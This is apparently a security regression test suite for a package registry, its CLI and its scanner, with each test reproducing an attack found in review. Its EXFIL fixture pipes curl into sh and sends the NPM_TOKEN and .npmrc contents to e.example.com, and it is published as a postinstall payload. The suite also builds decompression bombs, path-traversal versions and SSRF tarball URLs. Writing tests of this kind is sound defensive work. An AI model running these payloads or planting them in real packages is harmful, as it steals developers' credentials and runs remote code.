// Spec (security review before launch): each test reproduces an attack or a silent failure the
// independent review found, against the real registry, CLI and scanner.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { createHash, randomBytes } from "node:crypto";
import { chmodSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, apm, getJson, dig, ROOT, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const PASSWORD = "correct-horse-battery";
const EXFIL = "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n";
let clock = Date.parse("2026-09-01T00:00:00Z");
let work: string;

beforeAll(() => {
  work = mkdtempSync(join(tmpdir(), "apm-review-"));
});

// ---------- a tar writer, so tests control every header byte ----------
type TarFile = { path: string; data: string | Uint8Array; sizeField?: string };

function tarHeader(path: string, size: number, sizeField?: string): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, off: number, len: number): void => h.set(new TextEncoder().encode(s).subarray(0, len), off);
  put(path, 0, 100);
  put("0000644\0", 100, 8);
  put("0000000\0", 108, 8);
  put("0000000\0", 116, 8);
  put(sizeField ?? `${size.toString(8).padStart(11, "0")}\0`, 124, 12);
  put("00000000000\0", 136, 12);
  put("        ", 148, 8);
  put("0", 156, 1);
  put("ustar\0", 257, 6);
  put("00", 263, 2);
  let sum = 0;

  for (const b of h) sum += b;
  put(`${sum.toString(8).padStart(6, "0")}\0 `, 148, 8);

  return h;
}

function makeTar(files: TarFile[]): Uint8Array<ArrayBuffer> {
  const parts: Uint8Array[] = [];

  for (const f of files) {
    const data = typeof f.data === "string" ? new TextEncoder().encode(f.data) : f.data;
    parts.push(tarHeader(`package/${f.path}`, data.length, f.sizeField));
    parts.push(data);
    const pad = (512 - (data.length % 512)) % 512;

    if (pad > 0) parts.push(new Uint8Array(pad));
  }

  parts.push(new Uint8Array(1024));
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let off = 0;

  for (const p of parts) {
    out.set(p, off);
    off += p.length;
  }

  return out;
}

function makeTgz(files: TarFile[]): Uint8Array {
  return Bun.gzipSync(makeTar(files));
}

/** A package tarball: package.json from `manifest` plus `files`. */
function pkgTgz(manifest: Record<string, unknown>, files: Record<string, string> = { "index.js": "module.exports = 1;\n" }): Uint8Array {
  return makeTgz([{ path: "package.json", data: JSON.stringify(manifest) }, ...Object.entries(files).map(([path, data]) => ({ path, data }))]);
}

/** A publish request the way npm sends it, with a tarball built byte by byte. */
async function putPublish(reg: Registry, token: string, manifest: Record<string, unknown> & { name: string; version: string }, tgz: Uint8Array): Promise<{ status: number; body: unknown; headers: Headers }> {
  const body = {
    _id: manifest.name,
    name: manifest.name,
    "dist-tags": { latest: manifest.version },
    versions: { [manifest.version]: manifest },
    _attachments: { [`x-${randomBytes(4).toString("hex")}.tgz`]: { content_type: "application/octet-stream", data: Buffer.from(tgz).toString("base64"), length: tgz.length } },
  };

  const res = await fetch(`${reg.url}${manifest.name.startsWith("@") ? `@${encodeURIComponent(manifest.name.slice(1))}` : encodeURIComponent(manifest.name)}`, {
    method: "PUT",
    headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
    body: JSON.stringify(body),
  });

  const text = await res.text();
  let parsed: unknown = text;

  try {
    parsed = JSON.parse(text);
  } catch {
    // keep text
  }

  return { status: res.status, body: parsed, headers: res.headers };
}

async function publishSimple(reg: Registry, token: string, name: string, version: string, extra: Record<string, unknown> = {}, files?: Record<string, string>): Promise<void> {
  const manifest = { name, version, license: "MIT", main: "index.js", ...extra };
  const r = await putPublish(reg, token, manifest, pkgTgz(manifest, files));

  if (r.status !== 201) throw new Error(`publish ${name}@${version}: ${r.status} ${JSON.stringify(r.body)}`);
}

function sha1(bytes: Uint8Array): string {
  return createHash("sha1").update(bytes).digest("hex");
}

// ---------- 1. storage path escape ----------
describe("versions never form storage paths", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("a version with ../ segments is refused and nothing is written outside the tarball store", async () => {
    const version = "1.0.0/../../../escaped";
    const manifest = { name: "trav-pkg", version, license: "MIT", main: "index.js" };
    const r = await putPublish(reg, alice, manifest, pkgTgz(manifest));
    expect(r.status).toBe(400);
    // blobs are keyed by content digest, so nothing a client sends becomes a storage key
    expect((await reg.blobs.keys()).filter((k) => k.includes("escaped") || k.includes(".."))).toEqual([]);
    expect((await getJson(`${reg.url}trav-pkg`)).status).toBe(404);
  });

  test("a version that is not strict semver is refused", async () => {
    for (const version of ["1.0.0.evil", "1.0.0-", "01.0.0", "1.0.0 "]) {
      const manifest = { name: "loose-version", version, license: "MIT", main: "index.js" };
      const r = await putPublish(reg, alice, manifest, pkgTgz(manifest));
      expect(r.status, version).toBe(400);
    }
  });
});

// ---------- 2. archive parser hangs and decompression bombs ----------
describe("malformed archives are refused, never hang", () => {
  test("a tar header with a negative size gets a 400 from a registry that keeps answering", async () => {
    const reg = await startRegistry({ now: () => clock });

    try {
      const token = await addUser(reg, "alice", PASSWORD);
      const manifest = { name: "neg-size", version: "1.0.0", license: "MIT", main: "index.js" };

      const tgz = makeTgz([
        { path: "package.json", data: JSON.stringify(manifest) },
        { path: "index.js", data: "module.exports = 1;\n", sizeField: "-0000001000\0" },
      ]);

      let status = 0;

      try {
        const body = { name: "neg-size", "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": manifest }, _attachments: { "neg-size-1.0.0.tgz": { data: Buffer.from(tgz).toString("base64"), length: tgz.length } } };
        const res = await fetch(`${reg.url}neg-size`, { method: "PUT", headers: { "content-type": "application/json", authorization: `Bearer ${token}` }, body: JSON.stringify(body), signal: AbortSignal.timeout(15_000) });
        status = res.status;
      } catch {
        status = -1; // timed out: the registry froze
      }

      expect(status).toBe(400);
      const ping = await fetch(`${reg.url}-/ping`, { signal: AbortSignal.timeout(5_000) }).then((r) => r.status).catch(() => -1);
      expect(ping).toBe(200);
    } finally {
      await reg.stop();
    }
  });

  describe("in-process limits", () => {
    let reg: Registry;
    let alice: string;
    beforeAll(async () => {
      reg = await startRegistry({ now: () => clock });
      alice = await addUser(reg, "alice", PASSWORD);
    });
    afterAll(async () => {
      await reg?.stop();
    });

    test("a tarball that inflates past 200 MB is refused with 413", async () => {
      const manifest = { name: "zip-bomb", version: "1.0.0", license: "MIT", main: "index.js" };
      const tgz = Bun.gzipSync(new Uint8Array(210 * 1024 * 1024), { level: 1 });
      const r = await putPublish(reg, alice, manifest, tgz);
      expect(r.status).toBe(413);
      expect((await getJson(`${reg.url}zip-bomb`)).status).toBe(404);
    });

    test("a gzip'd audit body that inflates past the body cap is refused with 413", async () => {
      const json = `{"left-pad":["1.0.0"]${" ".repeat(60 * 1024 * 1024)}}`;
      const gz = Bun.gzipSync(new TextEncoder().encode(json));
      const res = await fetch(`${reg.url}-/npm/v1/security/advisories/bulk`, { method: "POST", headers: { "content-type": "application/json", "content-encoding": "gzip" }, body: gz });
      expect(res.status).toBe(413);
    });
  });
});

// ---------- 3. scoped namespace hijack during an npm outage ----------
describe("an npm outage never hands out scoped names", () => {
  let broken: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    broken = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("upstream down", { status: 503 }) });
    reg = await startRegistry({ now: () => clock, upstream: broken.url.toString() });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
    broken?.stop(true);
  });

  test("a first publish of a scoped name is refused while npm cannot be asked", async () => {
    const manifest = { name: "@alice/outage-claim", version: "1.0.0", license: "MIT", main: "index.js" };
    const r = await putPublish(reg, alice, manifest, pkgTgz(manifest));
    expect(r.status).toBe(503);
    expect((await getJson(`${reg.url}@alice%2Foutage-claim`)).status).toBe(404);
  });

  test("npm audit through apm says the advisory service is unavailable instead of answering clean", async () => {
    const r = await getJson(`${reg.url}-/npm/v1/security/advisories/bulk`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ "left-pad": ["1.0.0"] }) });
    expect(r.status).toBe(503);
    const apmAudit = await getJson(`${reg.url}-/apm/v1/audit`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ "left-pad": ["1.0.0"] }) });
    expect(apmAudit.status).toBe(200);
    expect(JSON.stringify(dig(apmAudit.body, "unavailable"))).toContain("left-pad");
  });
});

// ---------- 4. npm aliases and other specs in dependency checks ----------
describe("dependency checks see through aliases", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishSimple(reg, alice, "danger-leaf", "1.0.0", { scripts: { postinstall: "node x.js" } }, { "index.js": "module.exports = 1;\n", "x.js": EXFIL });
    await publishSimple(reg, alice, "alias-top", "1.0.0", { dependencies: { "aliased-dep": "npm:danger-leaf@1.0.0" } });
    await publishSimple(reg, alice, "gitdep-top", "1.0.0", { dependencies: { gitdep: "github:evil/repo" } });
    clock += 2 * DAY;
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("resolve refuses a package whose npm: alias points at a dangerous version", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/resolve?name=alias-top`);
    expect(r.status, JSON.stringify(r.body)).toBe(422);
    expect(JSON.stringify(r.body)).toContain("danger-leaf");
  });

  test("the publish-time dependency check follows the alias too", async () => {
    const s = await getJson(`${reg.url}-/apm/v1/score/alias-top/1.0.0`);
    expect(JSON.stringify(dig(s.body, "signals"))).toContain("risky-dependency");
  });

  test("a dependency apm cannot check (git) is reported as unchecked by name", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/resolve?name=gitdep-top`);
    expect(r.status, JSON.stringify(r.body)).toBe(200);
    expect(Number(dig(r.body, "tree", "unchecked"))).toBeGreaterThanOrEqual(1);
    expect(JSON.stringify(dig(r.body, "tree", "uncheckedDeps"))).toContain("gitdep");
  });
});

// ---------- 5. analysis limits ----------
describe("an analysis that could not read everything is not a pass", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("malicious code padded past the per-file limit scores below the floor and lists the skipped file", async () => {
    const padded = `${EXFIL}/*${" ".repeat(34 * 1024 * 1024)}*/\n`;
    await publishSimple(reg, alice, "padded-evil", "1.0.0", {}, { "index.js": padded });
    clock += 2 * DAY;
    const s = await getJson(`${reg.url}-/apm/v1/score/padded-evil/1.0.0`);
    expect(s.status).toBe(200);
    expect(Number(dig(s.body, "score"))).toBeLessThan(40);
    expect(JSON.stringify(dig(s.body, "signals"))).toContain("incomplete");
    expect(JSON.stringify(dig(s.body, "skipped"))).toContain("index.js");
    const r = await getJson(`${reg.url}-/apm/v1/resolve?name=padded-evil`);
    expect(r.status).toBe(422);
  });

  test("a file too large for the secret scan is named in a publish warning", async () => {
    const big = `${"x".repeat(34 * 1024 * 1024)}\nnpm_${"a".repeat(36)}\n`;
    const manifest = { name: "big-secret-file", version: "1.0.0", license: "MIT", main: "index.js" };
    const r = await putPublish(reg, alice, manifest, pkgTgz(manifest, { "index.js": "module.exports = 1;\n", "data.txt": big }));
    expect(r.status).toBeGreaterThanOrEqual(200);
    const warned = `${JSON.stringify(dig(r.body, "warnings") ?? "")} ${r.headers.get("npm-notice") ?? ""}`;
    expect(warned).toContain("data.txt");
  });
});

// ---------- 6 and 10. upstream tarballs: removal, integrity, origins ----------
describe("upstream tarballs are checked on every read", () => {
  let upstream: Registry;
  let reg: Registry;
  let upTok: string;
  beforeAll(async () => {
    upstream = await startRegistry({ now: () => clock });
    upTok = await addUser(upstream, "upalice", PASSWORD);
    await publishSimple(upstream, upTok, "cache-pkg", "1.0.0");
    reg = await startRegistry({ now: () => clock, upstream: upstream.url, upstreamTtlMs: 0 });
  });
  afterAll(async () => {
    await reg?.stop();
    await upstream?.stop();
  });

  test("tampered bytes in the upstream cache are never served", async () => {
    const pack = await getJson(`${upstream.url}cache-pkg`);
    const shasum = String(dig(pack.body, "versions", "1.0.0", "dist", "shasum"));
    const first = await fetch(`${reg.url}cache-pkg/-/cache-pkg-1.0.0.tgz`);
    expect(first.status).toBe(200);
    expect(sha1(new Uint8Array(await first.arrayBuffer()))).toBe(shasum);
    const cached = await reg.blobs.keys();
    expect(cached.length).toBeGreaterThan(0);

    for (const key of cached) await reg.blobs.put(key, "tampered bytes");
    const second = await fetch(`${reg.url}cache-pkg/-/cache-pkg-1.0.0.tgz`);

    if (second.status === 200) expect(sha1(new Uint8Array(await second.arrayBuffer()))).toBe(shasum);
    else expect(second.status).toBeGreaterThanOrEqual(500);
  });

  test("a version removed upstream stops being served from the cache", async () => {
    const rv = await getJson(`${upstream.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${upTok}` },
      body: JSON.stringify({ name: "cache-pkg", version: "1.0.0", reason: "malware", password: PASSWORD }),
    });

    expect(rv.status, JSON.stringify(rv.body)).toBe(200);
    const after = await fetch(`${reg.url}cache-pkg/-/cache-pkg-1.0.0.tgz`);
    expect(after.status).toBe(404);
  });
});

describe("upstream tarball URLs cannot reach other hosts", () => {
  let internal: ReturnType<typeof Bun.serve>;
  let fakeNpm: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let internalHits = 0;
  beforeAll(async () => {
    const manifest = { name: "ssrf-pkg", version: "1.0.0", license: "MIT", main: "index.js" };
    const tgz = pkgTgz(manifest);
    const integrity = `sha512-${createHash("sha512").update(tgz).digest("base64")}`;
    internal = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: () => {
        internalHits++;

        return new Response(tgz);
      },
    });
    const internalUrl = `${internal.url.toString()}secret.tgz`;
    fakeNpm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch(req) {
        const p = new URL(req.url).pathname;

        if (p === "/redirect.tgz") return Response.redirect(internalUrl, 302);

        if (p !== "/ssrf-pkg") return Response.json({ error: "Not found" }, { status: 404 });
        const doc = (version: string, tarball: string) => ({ ...manifest, version, dist: { tarball, integrity, shasum: sha1(tgz) } });

        return Response.json({
          name: "ssrf-pkg",
          "dist-tags": { latest: "1.1.0" },
          versions: { "1.0.0": doc("1.0.0", internalUrl), "1.1.0": doc("1.1.0", `${fakeNpm.url.toString()}redirect.tgz`) },
          time: { "1.0.0": "2025-01-01T00:00:00.000Z", "1.1.0": "2025-02-01T00:00:00.000Z" },
        });
      },
    });
    reg = await startRegistry({ now: () => clock, upstream: fakeNpm.url.toString() });
  });
  afterAll(async () => {
    await reg?.stop();
    fakeNpm?.stop(true);
    internal?.stop(true);
  });

  test("a tarball URL on another origin is never fetched", async () => {
    const r = await fetch(`${reg.url}ssrf-pkg/-/ssrf-pkg-1.0.0.tgz`);
    expect(r.status).toBeGreaterThanOrEqual(400);
    await getJson(`${reg.url}-/apm/v1/score/ssrf-pkg/1.0.0`);
    expect(internalHits).toBe(0);
  });

  test("a redirect from the upstream to another origin is not followed", async () => {
    const r = await fetch(`${reg.url}ssrf-pkg/-/ssrf-pkg-1.1.0.tgz`);
    expect(r.status).toBeGreaterThanOrEqual(400);
    expect(internalHits).toBe(0);
  });
});

// ---------- 7. concurrent publishes ----------
describe("two publishes of one version", () => {
  let slowNpm: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    // A slow npm keeps both publishes inside their checks at the same time, as on a real network.
    slowNpm = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: async () => (await Bun.sleep(300), Response.json({ error: "Not found" }, { status: 404 })) });
    reg = await startRegistry({ now: () => clock, upstream: slowNpm.url.toString() });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
    slowNpm?.stop(true);
  });

  test("racing publishes give one 201 and one 409, and the served tarball matches the stored shasum", async () => {
    const manifest = { name: "race-pkg", version: "1.0.0", license: "MIT", main: "index.js" };

    const [a, b] = await Promise.all([
      putPublish(reg, alice, manifest, pkgTgz(manifest, { "index.js": "module.exports = 'first';\n" })),
      putPublish(reg, alice, manifest, pkgTgz(manifest, { "index.js": "module.exports = 'second';\n" })),
    ]);

    expect([a.status, b.status].sort()).toEqual([201, 409]);
    const pack = await getJson(`${reg.url}race-pkg`);
    const shasum = String(dig(pack.body, "versions", "1.0.0", "dist", "shasum"));
    const tgz = await fetch(`${reg.url}race-pkg/-/race-pkg-1.0.0.tgz`);
    expect(tgz.status).toBe(200);
    expect(sha1(new Uint8Array(await tgz.arrayBuffer()))).toBe(shasum);
  });
});

// ---------- 8. "couldn't check" is never clean ----------
describe("checks that could not run are reported", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("the scan API lists versions it could not check", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/scan`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ packages: [{ name: "never-published-xyz", version: "1.0.0" }] }) });
    expect(r.status).toBe(200);
    expect(JSON.stringify(dig(r.body, "unchecked"))).toContain("never-published-xyz");
  });

  test("the bun scanner in strict mode fails when the registry could not check a package", async () => {
    const mod: unknown = await import(join(ROOT, "packages", "bun-scanner", "src", "index.ts"));
    const scanner = dig(mod, "scanner");
    const scan = dig(scanner, "scan");

    if (typeof scan !== "function") throw new Error("scanner.scan missing");
    const before = process.env.APM_SCANNER_STRICT;
    process.env.APM_SCANNER_STRICT = "1";
    let threw = false;

    try {
      await scan.call(scanner, { packages: [{ name: "never-published-xyz", version: "1.0.0", tarball: `${reg.url}never-published-xyz/-/never-published-xyz-1.0.0.tgz`, requestedRange: "^1.0.0" }] });
    } catch {
      threw = true;
    } finally {
      if (before === undefined) delete process.env.APM_SCANNER_STRICT;
      else process.env.APM_SCANNER_STRICT = before;
    }

    expect(threw).toBe(true);
  });

  test("apm audit exits non-zero when an installed package could not be checked", async () => {
    const sb = makeSandbox(reg, alice);
    const app = mkdtempSync(join(work, "audit-app-"));
    writeFileSync(join(app, "package.json"), JSON.stringify({ name: "audit-app", version: "1.0.0", private: true }));
    mkdirSync(join(app, "node_modules", "ghost-local-only"), { recursive: true });
    writeFileSync(join(app, "node_modules", "ghost-local-only", "package.json"), JSON.stringify({ name: "ghost-local-only", version: "1.0.0" }));
    const r = await apm(["audit"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("ghost-local-only");
  });
});

// ---------- 9. .npmrc permissions ----------
describe("the token file", () => {
  test("saving a token makes an existing world-readable .npmrc private, atomically", async () => {
    const mod: unknown = await import(join(ROOT, "packages", "cli", "src", "config.ts"));
    const save = dig(mod, "saveToken");

    if (typeof save !== "function") throw new Error("saveToken missing");
    const dir = mkdtempSync(join(work, "npmrc-"));
    const rc = join(dir, ".npmrc");
    writeFileSync(rc, "registry=https://example.test/\n");
    chmodSync(rc, 0o644);
    save(rc, "https://example.test/", "apm_secret_token_value");
    expect(statSync(rc).mode & 0o777).toBe(0o600);
    expect(readFileSync(rc, "utf8")).toContain("apm_secret_token_value");
    expect(readFileSync(rc, "utf8")).toContain("registry=https://example.test/");
    expect(readdirSync(dir)).toEqual([".npmrc"]);
  });
});

// ---------- 11. the last owner ----------
describe("owners", () => {
  let reg: Registry;
  let alice: string;
  beforeAll(async () => {
    reg = await startRegistry({ now: () => clock });
    alice = await addUser(reg, "alice", PASSWORD);
    await publishSimple(reg, alice, "solo-owned", "1.0.0");
  });
  afterAll(async () => {
    await reg?.stop();
  });

  test("the last owner cannot be removed", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/owners`, {
      method: "DELETE",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "solo-owned", user: "alice", password: PASSWORD }),
    });

    expect(r.status).toBe(409);
    const p = await getJson(`${reg.url}-/apm/v1/packages/solo-owned`);
    expect(dig(p.body, "maintainers")).toEqual(["alice"]);
  });
});

// ---------- 12. one-letter searches ----------
describe("short searches", () => {
  let fake: ReturnType<typeof Bun.serve>;
  let reg: Registry;
  let upstreamSearches = 0;
  beforeAll(async () => {
    fake = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch(req) {
        const url = new URL(req.url);

        if (url.pathname !== "/-/v1/search") return Response.json({ error: "Not found" }, { status: 404 });
        upstreamSearches++;

        // npm refuses text shorter than two characters
        if ((url.searchParams.get("text") ?? "").length < 2) return Response.json({ error: "text must be at least 2 characters" }, { status: 400 });

        return Response.json({ objects: [], total: 0, time: new Date().toUTCString() });
      },
    });
    reg = await startRegistry({ upstream: fake.url.toString() });
  });
  afterAll(async () => {
    await reg?.stop();
    fake?.stop(true);
  });

  test("a one-character search does not ask npm and does not report npm as down", async () => {
    const r = await getJson(`${reg.url}-/v1/search?text=r&size=20`);
    expect(r.status).toBe(200);
    expect(dig(r.body, "upstreamFailed")).toBe(false);
    expect(upstreamSearches).toBe(0);
  });
});
